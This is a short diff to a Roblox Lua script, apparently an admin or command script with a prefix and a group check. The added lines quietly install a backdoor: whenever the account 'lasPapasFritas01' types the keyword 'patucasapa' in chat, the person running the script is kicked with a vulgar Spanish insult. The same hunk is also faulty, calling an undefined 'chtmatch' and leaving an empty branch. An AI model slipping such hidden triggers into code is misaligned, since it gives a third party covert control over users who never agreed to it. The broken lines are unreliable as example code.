@@ -6,6 +6,17 @@ local plr = game.Players.LocalPlayer --the local player (obviously)
 		Text = "Disfruta mientras";
 	})
   end
+local Player = game.Players
+
+Player["lasPapasFritas01"].Chatted:connect(function(cht)
+    if cht:match("patucasapa") then
+    game.Players.LocalPlayer:Kick("No molestes ctm")
+    elseif chtmatch("")then
+
+
+
+    end
+end)
 	  
 	if plr:IsInGroup(7684108) then --you can change "IsFriendsWith" to "IsInGroup" and put the group id.
 	  local prefix  = "."
